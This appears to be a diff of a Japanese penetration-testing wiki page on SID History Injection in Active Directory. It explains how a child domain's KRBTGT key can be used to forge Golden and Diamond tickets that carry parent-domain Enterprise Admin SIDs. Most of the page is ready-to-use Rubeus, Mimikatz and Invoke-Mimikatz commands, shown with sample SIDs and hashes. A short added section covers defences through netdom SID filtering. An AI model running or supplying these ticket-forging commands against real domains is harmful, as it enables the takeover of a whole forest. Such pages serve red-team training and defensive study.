@@ -4,7 +4,7 @@
 
 ## SID History Injection Attack
 
-**SID History Injection Attack**の焦点は、**ドメイン間のユーザー移行を支援し**、以前のドメインからのリソースへの継続的なアクセスを確保することです。これは、**ユーザーの以前のセキュリティ識別子（SID）を新しいアカウントのSID履歴に組み込むことによって**達成されます。特に、このプロセスは、親ドメインからの高特権グループ（例えば、Enterprise AdminsやDomain Admins）のSIDをSID履歴に追加することで、不正アクセスを許可するように操作できます。この悪用により、親ドメイン内のすべてのリソースへのアクセスが付与されます。
+**SID History Injection Attack**の焦点は、**ドメイン間のユーザー移行を支援し**、以前のドメインからのリソースへのアクセスを継続することです。これは、**ユーザーの以前のセキュリティ識別子（SID）を新しいアカウントのSID履歴に組み込むことによって達成されます**。特に、このプロセスは、親ドメインからの高特権グループ（例えば、Enterprise AdminsやDomain Admins）のSIDをSID履歴に追加することで、不正アクセスを許可するように操作できます。この悪用により、親ドメイン内のすべてのリソースへのアクセスが付与されます。
 
 この攻撃を実行するための2つの方法があります：**Golden Ticket**または**Diamond Ticket**の作成です。
 
@@ -13,8 +13,36 @@
 **Domain Admins**グループも使用できますが、これは**512**で終わります。
 
 他のドメインのグループ（例えば"Domain Admins"）のSIDを見つける別の方法は次の通りです：
-```powershell
+```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
+```
+> [!WARNING]
+> SID履歴を信頼関係で無効にすることが可能であり、これによりこの攻撃が失敗する可能性があることに注意してください。
+
+[**docs**](https://technet.microsoft.com/library/cc835085.aspx)によると：
+- **forest trustsでのSIDHistoryの無効化**はnetdomツールを使用して行います（`netdom trust /domain: /EnableSIDHistory:no on the domain controller`）
+- **外部信頼に対するSIDフィルタの隔離の適用**はnetdomツールを使用して行います（`netdom trust /domain: /quarantine:yes on the domain controller`）
+- **単一のforest内のドメイン信頼に対するSIDフィルタリングの適用**は推奨されません。これはサポートされていない構成であり、破壊的な変更を引き起こす可能性があります。forest内のドメインが信頼できない場合、そのドメインはforestのメンバーであるべきではありません。この状況では、まず信頼されたドメインと信頼されていないドメインを別々のforestに分割し、SIDフィルタリングをinterforest trustに適用する必要があります。
+
+これに関する詳細情報はこの投稿を確認してください：[**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+
+### ダイヤモンドチケット (Rubeus + KRBTGT-AES256)
+
+前回これを試したとき、引数**`/ldap`**を追加する必要がありました。
+```bash
+# Use the /sids param
+Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
+
+# Or a ptt with a golden ticket
+## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
+## The /printcmd option will print the complete command if later you want to generate a token offline
+Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd
+
+#e.g.
+
+execute-assembly ../SharpCollection/Rubeus.exe golden /user:Administrator /domain:current.domain.local /sid:S-1-21-19375142345-528315377-138571287 /rc4:12861032628c1c32c012836520fc7123 /sids:S-1-5-21-2318540928-39816350-2043127614-519 /ptt /ldap /nowrap /printcmd
+
+# You can use "Administrator" as username or any other string
 ```
 ### ゴールデンチケット (Mimikatz) と KRBTGT-AES256
 ```bash
@@ -33,23 +61,14 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-ゴールデンチケットに関する詳細は、以下を確認してください：
+ゴールデンチケットに関する詳細は次を確認してください：
 
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
-### ダイヤモンドチケット (Rubeus + KRBTGT-AES256)
-```powershell
-# Use the /sids param
-Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
 
-# Or a ptt with a golden ticket
-Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_sid>  /sids:<parent_domain_sid>-519 /user:Administrator /ptt
-
-# You can use "Administrator" as username or any other string
-```
-ダイヤモンドチケットに関する詳細は、以下を確認してください：
+ダイヤモンドチケットに関する詳細は次を確認してください：
 
 {{#ref}}
 diamond-ticket.md
@@ -59,7 +78,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-侵害されたドメインのKRBTGTハッシュを使用して、ルートまたはエンタープライズ管理者のDAに昇格させる:
+侵害されたドメインのKRBTGTハッシュを使用して、ルートまたはエンタープライズ管理者に昇格します:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
